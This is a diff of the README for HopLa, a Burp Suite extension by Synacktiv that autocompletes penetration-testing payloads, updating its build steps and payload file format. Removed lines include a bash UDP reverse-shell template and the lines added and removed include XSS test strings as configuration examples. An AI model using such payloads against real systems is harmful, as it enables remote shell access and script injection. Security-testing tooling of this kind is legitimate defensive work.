@@ -1,4 +1,4 @@
-# HopLa
+# HopLa V2
 
 💥 All the power of PayloadsAllTheThings, without the overhead. 
 This extension adds autocompletion support and useful payloads in Burp Suite to make your intrusion easier.
@@ -13,7 +13,6 @@ Released as open source by [Synacktiv 🥷](https://www.synacktiv.com/)
 
 ## Getting started
 
-
 ### Installation
 
  * Download the jar file from the release directory
@@ -21,7 +20,37 @@ Released as open source by [Synacktiv 🥷](https://www.synacktiv.com/)
 
 ### Build
 
-Execute `gradle build` and you'll have the plugin ready in `releases/HopLa.jar`.
+Build with Docker or Podman:
+
+```bash
+$ podman build -t hopla .
+
+$ podman run --rm  -v "$PWD":/data hopla gradle build
+Starting a Gradle Daemon (subsequent builds will be faster)
+> Task :compileJava
+
+> Task :encryptResource
+Encrypting /data/src/main/resources/default-payloads.yaml to /data/build/encryptedResources/default-payloads.enc.yaml
+
+> Task :processResources
+> Task :classes
+> Task :jar
+> Task :assemble
+> Task :compileTestJava NO-SOURCE
+> Task :processTestResources NO-SOURCE
+> Task :testClasses UP-TO-DATE
+> Task :test NO-SOURCE
+> Task :check UP-TO-DATE
+> Task :build
+
+BUILD SUCCESSFUL in 11s
+4 actionable tasks: 4 executed
+
+$ ls build/libs/
+HopLa-2.0.0.jar
+```
+
+Execute `gradle build` and you'll have the plugin ready in `build/libs/HopLa-2.0.0.jar`.
 
 ## Usage
 
@@ -41,79 +70,39 @@ for_window [class=".*burp-StartBurp.*" title="^ $"] floating enable
 
 ### How to add payloads
 
-The JSON payloads file follow the structure:
+The YAML payloads file follow the structure:
 
-```json
-{
-    "categories": [
-        {
-            "name": "XSS",
-            "values": [
-                {
-                    "name": "Simple",
-                    "value": "<script>alert(1)</script>"
-                },
-                {
-                    "name": "Multiline",
-                    "value": "AAAA\nBBBB"
-                },
-                {
-                    "name" : "Nested XSS menu",
-                    "values": [
-                        {
-                            "name": "Simple 2",
-                            "value": "<script>alert(1)</script>"
-                        }
-                    ]
-                }
-            ]
-        }
-    ],
-    "keywords": [
-        {
-            "name": "Headers",
-            "values": [
-                "X-Forwarded-For",
-                "X-Originally-Forwarded-For",
-                "X-Originating-Ip",
-                "X-Originating-IP"
-            ]
-        }
-    ]
-}
+```yaml
+shortcut_search_and_replace: Ctrl+L
+shortcut_payload_menu: Ctrl+Q
+shortcut_collaborator: Ctrl+M
+shortcut_ia_chat: Ctrl+J
+
+categories:
+  - name: "XSS"
+    payloads:
+      - name: "Fingerprint"
+        value: "\"><h1>"
+        shortcut: Ctrl+k
+
+keywords:
+  - name: "Headers"
+    values:
+      - "Accept"
+      - "Accept-Charset"
 ```
+
 There is no nesting limit.
-
-You can automatically add a prompt dialog:
-```json
-{
-    "name":  "Bash UDP",
-    "value":  "sh -i >& /dev/udp/§IP§/§PORT§ 0>&1",
-    "prompt": ["IP","PORT"]
-},
-```
 
 To add only keywords that do not appear in the menu, you can add them in the keywords category:
 
-```json
-{
-    "keywords": [
-        {
-            "name": "Headers",
-            "values": [
-                "X-Forwarded-For",
-                "X-Originally-Forwarded-For",
-                "X-Originating-Ip",
-                "X-Originating-IP"
-            ]
-        }
-    ]
-}
+```yaml
+keywords:
+  - name: "Headers"
+    values:
+      - "Accept"
+      - "Accept-Charset"
 ```
-
-## Roadmap
-
-* Support custom key binding for payload menu
 
 ## Thanks To
 
